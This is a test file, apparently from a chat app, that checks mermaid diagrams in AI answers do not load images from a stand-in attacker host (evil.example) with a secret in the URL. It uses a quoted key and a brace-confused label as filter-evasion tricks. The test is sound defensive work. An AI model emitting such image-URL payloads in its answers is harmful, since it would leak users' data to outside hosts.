// @vitest-environment jsdom
import { expect, test, vi } from 'vitest'

const matrix = () => ({ a: 1, b: 0, c: 0, d: 1, e: 0, f: 0 })
Object.assign(SVGElement.prototype, {
  getBBox: () => ({ x: 0, y: 0, width: 10, height: 10 }),
  getComputedTextLength: () => 10,
  createSVGMatrix: matrix,
  getScreenCTM: matrix,
})

const fetched: string[] = []
Object.defineProperty(HTMLImageElement.prototype, 'complete', { get: () => true })
Object.defineProperty(HTMLImageElement.prototype, 'naturalWidth', { get: () => 40 })
Object.defineProperty(HTMLImageElement.prototype, 'naturalHeight', { get: () => 40 })
Object.assign(HTMLImageElement.prototype, { decode: () => Promise.resolve() })

new MutationObserver((records) => {
  for (const record of records) {
    for (const node of record.addedNodes) {
      if (!(node instanceof Element)) continue
      for (const one of [node, ...node.querySelectorAll('img, image')]) {
        if (one.localName !== 'img' && one.localName !== 'image') continue
        const address = one.getAttribute('src') ?? one.getAttribute('href')
        if (address) fetched.push(address)
      }
    }
  }
}).observe(document, { childList: true, subtree: true })

const { answerHtml } = await import('./drawn')
const { drawing } = await import('../../chat-kit/src/api')

async function fetchedWhileDrawn(markdown: string): Promise<string[]> {
  fetched.length = 0
  const before = drawing.version
  answerHtml(markdown)
  await vi.waitFor(() => {
    expect(drawing.version).toBeGreaterThan(before)
  })
  return fetched.filter((address) => address.includes('evil.example'))
}

test('a picture shape whose img key is quoted loads nothing while an answer draws it', async () => {
  expect(
    await fetchedWhileDrawn(
      '```mermaid\nflowchart TD\n  A@{ "img": "https://evil.example/quoted?secret=42", label: "x", h: 60 }\n```',
    ),
  ).toEqual([])
})

test('a picture shape after a label holding a closing brace loads nothing while an answer draws it', async () => {
  expect(
    await fetchedWhileDrawn(
      '```mermaid\nflowchart TD\n  A@{ label: "a}b", img: "https://evil.example/brace?secret=42", h: 60 }\n```',
    ),
  ).toEqual([])
})
